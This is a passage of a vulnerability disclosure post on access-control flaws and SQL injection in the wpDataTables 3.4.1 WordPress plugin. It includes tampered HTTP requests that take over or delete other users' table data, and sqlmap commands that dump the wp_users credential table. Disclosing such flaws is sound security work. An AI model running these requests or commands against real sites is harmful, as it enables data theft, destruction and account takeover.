&lt;strong&gt;Allow front-end editing&lt;/strong&gt; and on &lt;strong&gt;Limiting editing to own data only&lt;/strong&gt;.After this operation under the &lt;strong&gt;User ID column&lt;/strong&gt; select &lt;strong&gt;userid&lt;/strong&gt; like the image below:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/3ca0fb56ffef3ad944d867967fee4810.png&#34; alt=&#34;Set the permission&#34; /&gt;&lt;/p&gt;&lt;p&gt;In this way the plugin can show the data depending on the userid value.&lt;br /&gt;To publish the table it is necessary to copy its shortcode on the home page.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/f2932527ad601b36a33ae845c1c28269.png&#34; alt=&#34;Insert shortcode)&#34; /&gt;&lt;/p&gt;&lt;p&gt;Login through WordPress with the user &lt;strong&gt;test&lt;/strong&gt; (id=2), then go on the page &lt;a href=&#34;http://hostname/home/&#34;&gt;http://hostname/home/&lt;/a&gt; and the table will show only the record for this specific user:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/84314e1bdd8d297f4beea5dc7086e7a2.png&#34; alt=&#34;Data test user&#34; /&gt;&lt;/p&gt;&lt;p&gt;Click on &lt;strong&gt;New Entry&lt;/strong&gt; and add new record on the table:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/d9720d29c5d93a18d1177a8cb8cac88a.png&#34; alt=&#34;Add new entry&#34; /&gt;&lt;/p&gt;&lt;p&gt;With the HTTP Proxy like Burp Suite intercept the request for adding a new record:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/d067598b38be92e2e64343ce04a37d25.png&#34; alt=&#34;Burp - Add request&#34; /&gt;&lt;/p&gt;&lt;p&gt;This is the intercepted request:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;POST /portal/wp-admin/admin-ajax.php HTTP/1.1Host: hostnameUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://hostname/portal/home/Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 175DNT: 1Connection: closeCookie: [REDACTED]action=wdt_save_table_frontend&amp;amp;wdtNonce=55f87706c7&amp;amp;formdata%5Btable_id%5D=19&amp;amp;formdata%5Bwdt_ID%5D=&amp;amp;formdata%5Bname%5D=arduino&amp;amp;formdata%5Bprice%5D=10%2C00&amp;amp;formdata%5Buserid%5D=&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For exploiting this vulnerability is necessary to change the value of &lt;strong&gt;formdata[wdt_ID]&lt;/strong&gt; to &lt;strong&gt;1&lt;/strong&gt; and then &lt;strong&gt;delete&lt;/strong&gt; the following fields from the HTTP request:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;formdata%5Bname%5D=arduino&amp;amp;formdata%5Bprice%5D=10%2C00&amp;amp;formdata%5Buserid%5D=&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The new HTTP request to change the permission on the table will be like the following:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;POST /portal/wp-admin/admin-ajax.php HTTP/1.1Host: hostnameUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://hostname/portal/home/Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 175DNT: 1Connection: closeCookie: [REDACTED]action=wdt_save_table_frontend&amp;amp;wdtNonce=55f87706c7&amp;amp;formdata%5Btable_id%5D=19&amp;amp;formdata%5Bwdt_ID%5D=1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The image below shows the correct request/response received from the server:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/d66af867b83529996f13244d61e4e3e9.png&#34; alt=&#34;Burp - Modified request&#34; /&gt;&lt;/p&gt;&lt;p&gt;In this way with the user &lt;strong&gt;test&lt;/strong&gt; (id=2) we are able to overwrite the value of &lt;strong&gt;userid&lt;/strong&gt; and then we can view and manage the data of the user &lt;strong&gt;max&lt;/strong&gt; (id=1), as depicted by the following screenshot:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/1156cfd5ab5d2e0e009e34746e2b83ff.png&#34; alt=&#34;Takeover of data permissions&#34; /&gt;&lt;/p&gt;&lt;p&gt;The vulnerability is tested on wpDataTables version 3.4.1:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/db81e4598a66e10e267854e00bb9451a.png&#34; alt=&#34;Vulnerable version confirmation - wpDataTables 3.4.1&#34; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;By exploiting this issue an attacker is able to access and manage the data of all users in the same table.&lt;/p&gt;&lt;h3 id=&#34;2-software-does-not-restrict-or-incorrectly-restricts-access-to-a-resource-from-an-unauthorized-actor-cwe-284&#34;&gt;&lt;strong&gt;2 - Software does not restrict or incorrectly restricts access to a resource from an unauthorized actor - CWE-284&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; An authenticated user can tamper HTTP parameters to delete the data in the table of another user.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; A simple table with the settings of &lt;em&gt;Enable of front-end editing&lt;/em&gt; and &lt;em&gt;Limiting editing to own data only&lt;/em&gt; needs to be created and published in a page on WordPress.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24198&#34;&gt;CVE-2021-24198&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-24198&#34;&gt;&lt;strong&gt;8.1&lt;/strong&gt; (High)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;First, it is necessary to create a simple table with three columns and two or more rows. Then, the table can be published on a page with the following settings:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Allow front-end editing&lt;/li&gt;&lt;li&gt;Limit editing to own data only&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;An authenticated user that visits the page where the table is published can tamper the parameters to delete the data of another user that are present in the same table through &lt;strong&gt;id_key&lt;/strong&gt; and &lt;strong&gt;id_val&lt;/strong&gt; parameters.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected Endpoints&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;http://hostname/portal/wp-admin/admin-ajax.php&#34;&gt;http://hostname/portal/wp-admin/admin-ajax.php&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameters:&lt;/strong&gt; id_key and id_val&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payloads used.&lt;/p&gt;&lt;p&gt;The starting point is a standard installation of WordPress version 5.6 (the latest), with a fresh install of the wpDataTables plugin, without further configuration. After the plugin installation, it is necessary to create a simple table used for the vulnerability PoC.&lt;/p&gt;&lt;p&gt;To create the table, use the same steps of the previous vulnerability.&lt;/p&gt;&lt;p&gt;Login through WordPress with the user &lt;strong&gt;test&lt;/strong&gt; (id=2), then go on the page &lt;a href=&#34;http://hostname/home/&#34;&gt;http://hostname/home/&lt;/a&gt; and the table will show only the record for this specific user:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/975efdcb8dd74d7e8f3a0814d49778b2.png&#34; alt=&#34;Data test user&#34; /&gt;&lt;/p&gt;&lt;p&gt;Click on &lt;strong&gt;Delete&lt;/strong&gt; and delete the record on the table:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/353bc131e133f8c4df7a757d0bcdc626.png&#34; alt=&#34;Delete entry&#34; /&gt;&lt;/p&gt;&lt;p&gt;With the HTTP Proxy like Burp Suite intercept the request for deleting the record:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/d03be370d81cc7d36c3a49111206becb.png&#34; alt=&#34;Burp - Add request&#34; /&gt;&lt;/p&gt;&lt;p&gt;This is the intercepted request:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;POST /portal/wp-admin/admin-ajax.php HTTP/1.1Host: hostnameUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://hostname/portal/home/Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 175DNT: 1Connection: closeCookie: [REDACTED]action=wdt_delete_table_row&amp;amp;id_key=wdt_ID&amp;amp;id_val=2&amp;amp;table_id=21&amp;amp;wdtNonce=2fe2c28b36&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For exploiting this vulnerability is necessary to change the value of &lt;strong&gt;id_key&lt;/strong&gt; to &lt;strong&gt;userid&lt;/strong&gt; and the &lt;strong&gt;id_val&lt;/strong&gt; to &lt;strong&gt;1&lt;/strong&gt;:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;action=wdt_delete_table_row&amp;amp;id_key=userid&amp;amp;id_val=1&amp;amp;table_id=21&amp;amp;wdtNonce=2fe2c28b36&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The new HTTP request to change the permission on the table will be like the following:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;POST /portal/wp-admin/admin-ajax.php HTTP/1.1Host: hostnameUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://hostname/portal/home/Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 175DNT: 1Connection: closeCookie: [REDACTED]action=wdt_delete_table_row&amp;amp;id_key=userid&amp;amp;id_val=1&amp;amp;table_id=21&amp;amp;wdtNonce=2fe2c28b36&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The image below shows the correct request/response received from the server:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/2641b133c3513e672dd4c2f2bcaf59b1.png&#34; alt=&#34;Burp - Modified request&#34; /&gt;&lt;/p&gt;&lt;p&gt;In this way with the user &lt;strong&gt;test&lt;/strong&gt; (id=2) we are able to delete all the values of the user &lt;strong&gt;max&lt;/strong&gt; (id=1), as depicted by the following screenshot:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/71682a7f29ebc9c26d52791ed34c16e6.png&#34; alt=&#34;Takeover of data permissions&#34; /&gt;&lt;/p&gt;&lt;p&gt;The vulnerability is tested on wpDataTables version 3.4.1:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/db81e4598a66e10e267854e00bb9451a.png&#34; alt=&#34;Vulnerable version confirmation - wpDataTables 3.4.1&#34; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Important Note&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;In the &lt;strong&gt;id_key&lt;/strong&gt; parameter it is possible to insert any column name that are presents in the table (&lt;em&gt;string&lt;/em&gt; datatype).&lt;/p&gt;&lt;p&gt;The &lt;strong&gt;id_val&lt;/strong&gt; parameter supports only &lt;em&gt;int&lt;/em&gt; and &lt;em&gt;float&lt;/em&gt; datatype.&lt;/p&gt;&lt;p&gt;So, with these parameters it is possible to delete all records in the database that respect this condition, because of the query in the code that is similar to the following:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;DELETE FROM wp_wpdatatable_19 WHERE id_key=id_val -- id_val is datatype int or float;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;By exploiting this issue an attacker is able to delete the data of all users in the same table.&lt;/p&gt;&lt;h3 id=&#34;3-improper-neutralization-of-special-elements-used-in-an-sql-command-sql-injection-cwe-89&#34;&gt;&lt;strong&gt;3 - Improper Neutralization of Special Elements used in an SQL Command (&amp;lsquo;SQL Injection&amp;rsquo;) - CWE-89&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; An authenticated user can perform a SQL injection attack to access all the data in the database and obtain access to the WordPress application.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; WordPress account. Also, a simple table with default settings needs to be created via the web interface.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24199&#34;&gt;CVE-2021-24199&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-24199&#34;&gt;&lt;strong&gt;6.5&lt;/strong&gt; (Medium)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;First, it is necessary to create a simple table with two columns and two rows. Then, an authenticated user on the WordPress interface that visits the page where the tables are listed can perform a SQL injection attack in the table search parameter &lt;strong&gt;start&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected Endpoints&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;http://hostname/wp-admin/admin-ajax.php?action=get_wdtable&amp;amp;table_id=1&#34;&gt;http://hostname/wp-admin/admin-ajax.php?action=get_wdtable&amp;amp;table_id=1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameter:&lt;/strong&gt; start&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payloads used.&lt;/p&gt;&lt;p&gt;The starting point is a standard installation of WordPress version 5.6 (the latest), with a fresh install of the wpDataTables plugin, without further configuration. After the plugin installation, it is necessary to create a simple table used for the vulnerability PoC.&lt;/p&gt;&lt;p&gt;To create the table, login to WordPress as &lt;strong&gt;admin&lt;/strong&gt;.&lt;br /&gt;Under &lt;strong&gt;wpDataTables&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Create a Table&lt;/strong&gt;, select &lt;strong&gt;Create a data table manually&lt;/strong&gt; and then &lt;strong&gt;Next&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/18057ef8f7a7d086bfbe9ee37ac9e46a.png&#34; alt=&#34;Creation of the table (1)&#34; /&gt;&lt;/p&gt;&lt;p&gt;The table can have simple data, like the following:* &lt;strong&gt;Table name:&lt;/strong&gt; products* &lt;strong&gt;Number of columns:&lt;/strong&gt; 2* &lt;strong&gt;Column 1:&lt;/strong&gt;  * &lt;strong&gt;Name:&lt;/strong&gt; name  * &lt;strong&gt;Type:&lt;/strong&gt; One line string* &lt;strong&gt;Column 2:&lt;/strong&gt;  * &lt;strong&gt;Name:&lt;/strong&gt; price  * &lt;strong&gt;Type:&lt;/strong&gt; Integer&lt;/p&gt;&lt;p&gt;Add the table data via the web interface:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/26aa9c7f9d8767ad9db0cf57f1eafd6d.png&#34; alt=&#34;Creation of the table (2)&#34; /&gt;&lt;/p&gt;&lt;p&gt;Confirm the table with &lt;strong&gt;Create the table&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Open in Excel-like editor&lt;/strong&gt;&lt;br /&gt;Insert two rows with some data , like the following picture, then confirm with &lt;strong&gt;Save Changes&lt;/strong&gt;:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/0a4a1693d5639add992b75de562cb4b1.png&#34; alt=&#34;Creation of the table (3)&#34; /&gt;&lt;/p&gt;&lt;p&gt;Re-login or leave the authenticated session.&lt;br /&gt;On thew WordPress administrative page, under &lt;strong&gt;Dashboard&lt;/strong&gt;, select &lt;strong&gt;wpDataTables&lt;/strong&gt; menu:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/7f49b4b013dd1e1caf3c7cb01067d130.png&#34; alt=&#34;Selection of the table (1)&#34; /&gt;&lt;/p&gt;&lt;p&gt;Select the table name, &lt;strong&gt;products&lt;/strong&gt; in this case.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/c1284d760c77acce1a1bb6e0ed59db81.png&#34; alt=&#34;Selection of the table (2)&#34; /&gt;&lt;/p&gt;&lt;p&gt;Intercept the browser session with a proxy like &lt;a href=&#34;https://portswigger.net/burp&#34;&gt;&lt;strong&gt;Burp Suite&lt;/strong&gt;&lt;/a&gt;.&lt;br /&gt;The HTTP POST request will be like the following:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/9b599e15ce7b9a362394be5a93a22527.png&#34; alt=&#34;Burp - Selection of the table&#34; /&gt;&lt;/p&gt;&lt;p&gt;Copy the intercepted request, and paste the content a text file named &lt;code&gt;draw.txt&lt;/code&gt;, similar to the following one:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php?action=get_wdtable&amp;amp;table_id=1 HTTP/1.1Host: hostnameUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://hostname/wp-admin/admin.php?page=wpdatatables-constructor&amp;amp;source&amp;amp;table_id=1Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 1044Origin: http://hostnameConnection: closeCookie: wordpress_55f2ba4d3fe29d8de44211c463b1efe7=admin%7C1613576095%7CVxLK5MvQeqjUfOzdq5Kilo2JSGijjIIduyf6hzezC2y%7C69fdaaf35f2fea0cfe3ff830a3917370ed5dc49b4637c1945177e57d6228703e; wpsc_ticket_filter=%7B%22label%22%3A%22unresolved_agent%22%2C%22query%22%3A%5B%7B%22key%22%3A%22ticket_status%22%2C%22value%22%3A%5B3%2C4%2C5%5D%2C%22compare%22%3A%22IN%22%7D%5D%2C%22orderby%22%3A%22date_updated%22%2C%22order%22%3A%22DESC%22%2C%22page%22%3A1%2C%22custom_filter%22%3A%7B%22s%22%3A%22%22%7D%7D; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_55f2ba4d3fe29d8de44211c463b1efe7=admin%7C1613576095%7CVxLK5MvQeqjUfOzdq5Kilo2JSGijjIIduyf6hzezC2y%7C1aa7b20915d029cb8a392b0ad91edf1b3d1660efd91dff46e513a372e4b855a2; wp-settings-1=libraryContent%3Dbrowse%26mfold%3Do; wp-settings-time-1=1613403295draw=1&amp;amp;columns%5B0%5D%5Bdata%5D=0&amp;amp;columns%5B0%5D%5Bname%5D=wdt_ID&amp;amp;columns%5B0%5D%5Bsearchable%5D=true&amp;amp;columns%5B0%5D%5Borderable%5D=true&amp;amp;columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&amp;amp;columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&amp;amp;columns%5B1%5D%5Bdata%5D=1&amp;amp;columns%5B1%5D%5Bname%5D=name&amp;amp;columns%5B1%5D%5Bsearchable%5D=true&amp;amp;columns%5B1%5D%5Borderable%5D=true&amp;amp;columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&amp;amp;columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&amp;amp;columns%5B2%5D%5Bdata%5D=2&amp;amp;columns%5B2%5D%5Bname%5D=price&amp;amp;columns%5B2%5D%5Bsearchable%5D=true&amp;amp;columns%5B2%5D%5Borderable%5D=true&amp;amp;columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&amp;amp;columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&amp;amp;order%5B0%5D%5Bcolumn%5D=0&amp;amp;order%5B0%5D%5Bdir%5D=asc&amp;amp;start=0&amp;amp;length=10&amp;amp;search%5Bvalue%5D=&amp;amp;search%5Bregex%5D=false&amp;amp;currentUserId=1&amp;amp;currentUserLogin=admin&amp;amp;currentPostIdPlaceholder=&amp;amp;currentUserFirstName=&amp;amp;currentUserLastName=&amp;amp;currentUserEmail=test%40mail.com&amp;amp;currentDate=15%2F02%2F2021&amp;amp;currentDateTime=15%2F02%2F2021+03%3A40+PM&amp;amp;currentTime=03%3A40+PM&amp;amp;wpdbPlaceholder=wp_&amp;amp;wdtNonce=7a0d38fc5e&amp;amp;showAllRows=on&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then, use the &lt;a href=&#34;http://sqlmap.org&#34;&gt;&lt;strong&gt;SQLMap&lt;/strong&gt;&lt;/a&gt; tool to exploit the vulnerability with the following command:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# Clear SQLMap local cache:rm -rf ~/.local/share/sqlmapsqlmap -r draw.txt --level=5 --risk=3 --random-agent --dbms=mysql --banner -p start --batch&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The banner of the database is gathered as PoC of the vulnerability:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/54ce2183472c83baaf01c211edbaad4c.png&#34; alt=&#34;SQLMap - Banner&#34; /&gt;&lt;/p&gt;&lt;p&gt;It is possible to dump all the WordPress database to extract the credentials. If a successful password cracking attack is accomplished, an attacker can use the credentials to login to the WordPress admin page.&lt;br /&gt;To extract the &lt;strong&gt;wp_users&lt;/strong&gt; table, use the following command:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;sqlmap -r draw.txt --level=5 --risk=3 --random-agent --dbms=mysql -p start -D wordpress -T wp_users --dump&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/bb8700cb2976763ed35c778acc659f0e.png&#34; alt=&#34;SQLMap - Database dump&#34; /&gt;&lt;/p&gt;&lt;p&gt;The vulnerability is tested on wpDataTables version 3.4.1, as depicted by the following screenshot:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/db81e4598a66e10e267854e00bb9451a.png&#34; alt=&#34;Vulnerable version confirmation - wpDataTables 3.4.1&#34; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;By exploiting this issue an attacker is able to access all the data in the database and obtain access to the WordPress application, because all the data, including WordPress credentials, can be extracted and cracked.&lt;br /&gt;It is important to note that a valid WordPress administrator account is also able to execute Remote Code Execution attack because of the capability of installing or modifying existing plugins or themes via the web interface. This scenario allows the entire compromise of the target operating system where wpDataTables is installed.&lt;/p&gt;&lt;h3 id=&#34;4-improper-neutralization-of-special-elements-used-in-an-sql-command-sql-injection-cwe-89&#34;&gt;&lt;strong&gt;4 - Improper Neutralization of Special Elements used in an SQL Command (&amp;lsquo;SQL Injection&amp;rsquo;) - CWE-89&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; An authenticated user can perform a SQL injection attack to access all the data in the database and obtain access to the WordPress application.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; WordPress account. Also, a simple table with default settings needs to be created via the web interface.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24200&#34;&gt;CVE-2021-24200&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-24200&#34;&gt;&lt;strong&gt;6.5&lt;/strong&gt; (Medium)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;First, it is necessary to create a simple table with two columns and two rows. Then, an authenticated user on the WordPress interface that visits the page where the tables are listed can perform a SQL injection attack in the table search parameter &lt;strong&gt;length&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected Endpoints&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;http://hostname/wp-admin/admin-ajax.php?action=get_wdtable&amp;amp;table_id=1&#34;&gt;http://hostname/wp-admin/admin-ajax.php?action=get_wdtable&amp;amp;table_id=1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameter:&lt;/strong&gt; length&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payloads used.&lt;/p&gt;&lt;p&gt;The starting point is a standard installation of WordPress version 5.6 (the latest), with a fresh install of the wpDataTables plugin, without further configuration. After the plugin installation, it is necessary to create a simple table used for the vulnerability PoC.&lt;/p&gt;&lt;p&gt;To create the table, use the same steps of the previous vulnerability.&lt;/p&gt;&lt;p&gt;Re-login or leave the authenticated session.&lt;br /&gt;On thew WordPress administrative page, under &lt;strong&gt;Dashboard&lt;/strong&gt;, select &lt;strong&gt;wpDataTables&lt;/strong&gt; menu:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/7f49b4b013dd1e1caf3c7cb01067d130.png&#34; alt=&#34;Selection of the table (1)&#34; /&gt;&lt;/p&gt;&lt;p&gt;Select the table name, &lt;strong&gt;products&lt;/strong&gt; in this case.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/c1284d760c77acce1a1bb6e0ed59db81.png&#34; alt=&#34;Selection of the table (2)&#34; /&gt;&lt;/p&gt;&lt;p&gt;Intercept the browser session with a proxy like &lt;a href=&#34;https://portswigger.net/burp&#34;&gt;&lt;strong&gt;Burp Suite&lt;/strong&gt;&lt;/a&gt;.&lt;br /&gt;The HTTP POST request will be like the following:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/9b599e15ce7b9a362394be5a93a22527.png&#34; alt=&#34;Burp - Selection of the table&#34; /&gt;&lt;/p&gt;&lt;p&gt;Copy the intercepted request, and paste the content a text file named &lt;code&gt;draw.txt&lt;/code&gt;, similar to the following one:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php?action=get_wdtable&amp;amp;table_id=1 HTTP/1.1Host: hostnameUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://hostname/wp-admin/admin.php?page=wpdatatables-constructor&amp;amp;source&amp;amp;table_id=1Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 1044Origin: http://hostnameConnection: closeCookie: wordpress_55f2ba4d3fe29d8de44211c463b1efe7=admin%7C1613576095%7CVxLK5MvQeqjUfOzdq5Kilo2JSGijjIIduyf6hzezC2y%7C69fdaaf35f2fea0cfe3ff830a3917370ed5dc49b4637c1945177e57d6228703e; wpsc_ticket_filter=%7B%22label%22%3A%22unresolved_agent%22%2C%22query%22%3A%5B%7B%22key%22%3A%22ticket_status%22%2C%22value%22%3A%5B3%2C4%2C5%5D%2C%22compare%22%3A%22IN%22%7D%5D%2C%22orderby%22%3A%22date_updated%22%2C%22order%22%3A%22DESC%22%2C%22page%22%3A1%2C%22custom_filter%22%3A%7B%22s%22%3A%22%22%7D%7D; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_55f2ba4d3fe29d8de44211c463b1efe7=admin%7C1613576095%7CVxLK5MvQeqjUfOzdq5Kilo2JSGijjIIduyf6hzezC2y%7C1aa7b20915d029cb8a392b0ad91edf1b3d1660efd91dff46e513a372e4b855a2; wp-settings-1=libraryContent%3Dbrowse%26mfold%3Do; 